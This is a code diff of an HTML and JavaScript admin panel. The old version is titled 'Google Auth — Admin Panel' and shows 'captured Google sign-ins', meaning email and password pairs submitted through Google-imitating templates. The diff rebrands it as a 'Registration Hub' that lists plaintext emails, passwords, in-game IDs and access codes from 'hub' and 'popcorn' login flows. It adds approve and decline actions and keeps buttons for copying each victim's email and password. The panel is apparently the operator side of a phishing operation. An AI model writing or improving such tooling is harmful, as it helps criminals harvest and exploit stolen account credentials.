@@ -2,11 +2,11 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Google Auth — Admin Panel</title>
+  <title>Registration Hub — Admin Panel</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <meta name="description"
-        content="Admin panel for viewing captured Google sign-ins." />
+        content="Admin panel for viewing registration hub & popcorn records." />
 
   <style>
     :root {
@@ -162,7 +162,7 @@
     .section-sub {
       font-size: 8.5px;
       color: var(--text-muted);
-      max-width: 620px;
+      max-width: 720px;
       margin-bottom: 14px;
     }
 
@@ -253,6 +253,7 @@
 
     .logs-wrapper {
       margin-top: 14px;
+      overflow-x: auto;
     }
 
     .logs-table {
@@ -322,6 +323,31 @@
       color: #6b7280;
     }
 
+    .chip--hub {
+      border-color: rgba(59,130,246,0.8);
+      color: #bfdbfe;
+    }
+
+    .chip--popcorn {
+      border-color: rgba(249,115,22,0.9);
+      color: #fed7aa;
+    }
+
+    .chip--status-approved {
+      border-color: rgba(22,163,74,0.9);
+      color: #bbf7d0;
+    }
+
+    .chip--status-declined {
+      border-color: rgba(239,68,68,0.9);
+      color: #fecaca;
+    }
+
+    .chip--status-pending {
+      border-color: rgba(148,163,253,0.7);
+      color: #c7d2fe;
+    }
+
     .footer {
       margin-top: 18px;
       padding: 12px 0 18px;
@@ -338,10 +364,6 @@
       .logs-table {
         font-size: 8px;
       }
-      .logs-table th:nth-child(4),
-      .logs-table td:nth-child(4) {
-        display: none; /* прячем UA на очень узких экранах */
-      }
     }
 
   </style>
@@ -353,13 +375,13 @@
   <div class="header-wrap">
     <div class="inner header">
       <div class="logo-combo">
-        <div class="logo-mark">GA</div>
+        <div class="logo-mark">RH</div>
         <div class="logo-text-block">
           <div class="top-line">
-            <span>GOOGLE</span>
-            <span>AUTH</span>
+            <span>REG</span>
+            <span>HUB</span>
           </div>
-          <div class="sub-line">CAPTURE ADMIN</div>
+          <div class="sub-line">ADMIN PANEL • HUB + POPCORN</div>
         </div>
       </div>
 
@@ -374,21 +396,24 @@
     <div class="inner">
       <section>
         <div class="section-title">
-          <span class="bar"></span>Captured logins
+          <span class="bar"></span>Registrations & Popcorn
         </div>
         <div class="section-sub">
-          Здесь отображаются все отправленные формы (email / password) из Google-шаблонов.
-          Сверху видно общее количество записей, можно удалять по одной или подчистить всё
-          через <strong>Delete all</strong>. Никаких авто-действий — только ручное управление.
+          Здесь отображаются все регистрации из хаба (flow <strong>hub</strong>)
+          и “попкорн”-логины (flow <strong>popcorn</strong>).
+          Попкорн можно распознать по <strong>flow = POPCORN</strong> и/или
+          <code>ingameId = web-login</code>.  
+          Через действия справа можно <strong>approve / decline</strong> заявку
+          и копировать email / password.
         </div>
 
         <div class="card">
           <div class="card-header">
-            <div class="card-title">Stored records</div>
+            <div class="card-title">Stored registrations</div>
             <div style="display:flex;align-items:center;gap:8px;">
               <span class="pill" id="logs-count-pill">0 items</span>
-              <button class="btn-xs btn-xs--danger" id="delete-all-btn">
-                🗑 Delete all
+              <button class="btn-xs" id="reload-btn">
+                ⟳ Reload
               </button>
             </div>
           </div>
@@ -400,10 +425,13 @@
               <thead>
               <tr>
                 <th>#</th>
+                <th>Flow</th>
                 <th>Email</th>
                 <th>Password</th>
-                <th>User agent</th>
-                <th>Meta</th>
+                <th>In-game ID</th>
+                <th>Access code</th>
+                <th>Verify</th>
+                <th>Status</th>
                 <th>Created</th>
                 <th></th>
               </tr>
@@ -421,21 +449,21 @@
 
   <!-- FOOTER -->
   <footer class="footer">
-    GOOGLE AUTH PANEL — internal view for captured data. Keep this page private.
+    REGISTRATION HUB PANEL — internal view for hub & popcorn data. Keep this page private.
   </footer>
 </div>
 
 <script>
-  // ===== CONFIG: под себя меняешь URL'ы =====
+  // ===== CONFIG: под твой server.js =====
   const API_BASE = "/admin/api";
-  const LIST_URL = API_BASE + "/creds";          // GET  -> { items: [...] }
-  const DELETE_URL = API_BASE + "/creds/delete"; // POST -> { id }
-  const DELETE_ALL_URL = API_BASE + "/creds/delete-all"; // POST -> {}
+  const STATE_URL = API_BASE + "/state";                    // GET -> { idCodeRequests, emailCodeRequests, registrations }
+  const APPROVE_URL = API_BASE + "/registration/approve";   // POST -> { id, slot, link, note }
+  const DECLINE_URL = API_BASE + "/registration/decline";   // POST -> { id, reason, note }
 
   const tbodyEl = document.getElementById("logs-tbody");
   const countPill = document.getElementById("logs-count-pill");
   const globalStatusEl = document.getElementById("global-status");
-  const deleteAllBtn = document.getElementById("delete-all-btn");
+  const reloadBtn = document.getElementById("reload-btn");
 
   function setStatus(text, type) {
     globalStatusEl.textContent = text || "";
@@ -479,8 +507,8 @@
     if (!items || items.length === 0) {
       tbodyEl.innerHTML = `
         <tr>
-          <td colspan="7" style="text-align:center;color:var(--text-muted);padding:10px 0;">
-            No records yet.
+          <td colspan="10" style="text-align:center;color:var(--text-muted);padding:10px 0;">
+            No registrations yet.
           </td>
         </tr>`;
       countPill.textContent = "0 items";
@@ -498,27 +526,57 @@
 
     const rows = items.map((item, idx) => {
       const id = item.id ?? item.pk ?? idx;
+      const flow = (item.flow || "").toLowerCase();
       const email = item.email || "";
       const password = item.password || item.pass || "";
-      const ua = item.userAgent || item.ua || "";
-      const ip = item.ip || item.ip_address || "";
-      const country = item.country || item.geoCountry || "";
+      const ingameId = item.ingameId || "";
+      const accessCode = item.accessCode || "";
       const created = formatDate(item.createdAt || item.created_at || item.timestamp);
 
-      const metaChips = [];
-      if (ip)      metaChips.push(`<span class="chip"><span class="chip-label">IP</span><span class="mono">${ip}</span></span>`);
-      if (country) metaChips.push(`<span class="chip"><span class="chip-label">CTRY</span>${country}</span>`);
-      if (item.note) metaChips.push(`<span class="chip"><span class="chip-label">NOTE</span>${item.note}</span>`);
+      const idVerified = item.idVerified ? "ID✔" : "ID–";
+      const emailVerified = item.emailVerified ? "Mail✔" : "Mail–";
+
+      const status = (item.status || "pending").toLowerCase();
+
+      let flowChipClass = "chip";
+      let flowLabel = "HUB";
+      if (flow === "popcorn") {
+        flowChipClass += " chip--popcorn";
+        flowLabel = "POPCORN";
+      } else {
+        flowChipClass += " chip--hub";
+      }
+
+      let statusChipClass = "chip";
+      if (status === "approved") statusChipClass += " chip--status-approved";
+      else if (status === "declined") statusChipClass += " chip--status-declined";
+      else statusChipClass += " chip--status-pending";
 
       return `
         <tr data-id="${id}">
           <td>${idx + 1}</td>
+          <td>
+            <span class="${flowChipClass}">
+              <span class="chip-label">FLOW</span>${flowLabel}
+            </span>
+          </td>
           <td class="mono">${email || "—"}</td>
           <td class="mono">${password || "—"}</td>
-          <td style="max-width:260px;word-break:break-all;">
-            <span class="mono">${ua || "—"}</span>
+          <td class="mono">${ingameId || "—"}</td>
+          <td class="mono">${accessCode || "—"}</td>
+          <td>
+            <span class="chip">
+              <span class="chip-label">ID</span>${idVerified}
+            </span>
+            <span class="chip">
+              <span class="chip-label">MAIL</span>${emailVerified}
+            </span>
           </td>
-          <td>${metaChips.join(" ") || "—"}</td>
+          <td>
+            <span class="${statusChipClass}">
+              <span class="chip-label">STATUS</span>${status.toUpperCase()}
+            </span>
+          </td>
           <td>${created || "—"}</td>
           <td class="actions-cell">
             <button class="btn-xs btn-xs--primary"
@@ -533,10 +591,15 @@
                     data-id="${id}">
               📋 Pass
             </button>
-            <button class="btn-xs btn-xs--danger"
-                    data-action="delete"
+            <button class="btn-xs btn-xs--primary"
+                    data-action="approve"
                     data-id="${id}">
-              🗑
+              ✅ Approve
+            </button>
+            <button class="btn-xs btn-xs--danger"
+                    data-action="decline"
+                    data-id="${id}">
+              ❌ Decline
             </button>
           </td>
         </tr>
@@ -546,19 +609,21 @@
     tbodyEl.innerHTML = rows;
   }
 
-  async function loadLogs() {
-    setStatus("Loading records…", "");
+  async function loadState() {
+    setStatus("Loading registrations…", "");
     try {
-      const data = await getJSON(LIST_URL);
-      const items = Array.isArray(data) ? data : (data.items || []);
+      const data = await getJSON(STATE_URL);
+      const items = data && Array.isArray(data.registrations)
+        ? data.registrations
+        : [];
       renderRows(items);
       setStatus("Loaded.", "ok");
     } catch (e) {
       console.error(e);
-      setStatus("Failed to load records. Check " + LIST_URL, "err");
+      setStatus("Failed to load state. Check " + STATE_URL, "err");
       tbodyEl.innerHTML = `
         <tr>
-          <td colspan="7" style="text-align:center;color:var(--text-muted);padding:10px 0;">
+          <td colspan="10" style="text-align:center;color:var(--text-muted);padding:10px 0;">
             Error loading data.
           </td>
         </tr>`;
@@ -566,41 +631,13 @@
     }
   }
 
-  async function deleteOne(id) {
-    if (!confirm("Delete this record? This cannot be undone.")) return;
-    setStatus("Deleting record #" + id + "…", "");
-    try {
-      await postJSON(DELETE_URL, { id });
-      setStatus("Record deleted.", "ok");
-      await loadLogs();
-    } catch (e) {
-      console.error(e);
-      setStatus("Failed to delete record. Check backend.", "err");
-    }
-  }
-
-  async function deleteAll() {
-    if (!confirm("Delete ALL records? This cannot be undone.")) return;
-    setStatus("Deleting all records…", "");
-    try {
-      await postJSON(DELETE_ALL_URL, {});
-      setStatus("All records deleted.", "ok");
-      await loadLogs();
-    } catch (e) {
-      console.error(e);
-      setStatus("Failed to delete all records. Check backend.", "err");
-    }
-  }
-
   function findRowData(id) {
-    // в реальной жизни удобнее хранить items в массиве в JS,
-    // но тут мы просто читаем прямо из DOM
     const row = tbodyEl.querySelector(`tr[data-id="${id}"]`);
     if (!row) return {};
     const cells = row.children;
     return {
-      email: cells[1]?.textContent.trim() || "",
-      password: cells[2]?.textContent.trim() || ""
+      email: cells[2]?.textContent.trim() || "",
+      password: cells[3]?.textContent.trim() || ""
     };
   }
 
@@ -617,6 +654,42 @@
     }
   }
 
+  async function approveRegistration(id) {
+    const slot = prompt("Slot (optional, e.g. GROUP A / LOBBY 3):", "");
+    if (slot === null) return; // cancel
+    const link = prompt("Link (optional, lobby / room link):", "");
+    if (link === null) return;
+    const note = prompt("Internal note (optional):", "");
+    if (note === null) return;
+
+    setStatus("Approving #" + id + "…", "");
+    try {
+      await postJSON(APPROVE_URL, { id, slot, link, note });
+      setStatus("Registration approved.", "ok");
+      await loadState();
+    } catch (e) {
+      console.error(e);
+      setStatus("Failed to approve. Check backend.", "err");
+    }
+  }
+
+  async function declineRegistration(id) {
+    const reason = prompt("Decline reason (short):", "other");
+    if (reason === null) return;
+    const note = prompt("Internal note (optional):", "");
+    if (note === null) return;
+
+    setStatus("Declining #" + id + "…", "");
+    try {
+      await postJSON(DECLINE_URL, { id, reason, note });
+      setStatus("Registration declined.", "ok");
+      await loadState();
+    } catch (e) {
+      console.error(e);
+      setStatus("Failed to decline. Check backend.", "err");
+    }
+  }
+
   // делегируем клики по таблице
   tbodyEl.addEventListener("click", (e) => {
     const btn = e.target.closest("button[data-action]");
@@ -625,20 +698,22 @@
     const id = btn.getAttribute("data-id");
     if (!action || !id) return;
 
-    if (action === "delete") {
-      deleteOne(id);
-    } else if (action === "copy") {
+    if (action === "copy") {
       const field = btn.getAttribute("data-field");
       copyField(id, field);
+    } else if (action === "approve") {
+      approveRegistration(id);
+    } else if (action === "decline") {
+      declineRegistration(id);
     }
   });
 
-  deleteAllBtn.addEventListener("click", () => {
-    deleteAll();
+  reloadBtn.addEventListener("click", () => {
+    loadState();
   });
 
   // старт
-  loadLogs();
+  loadState();
 </script>
 
 </body>
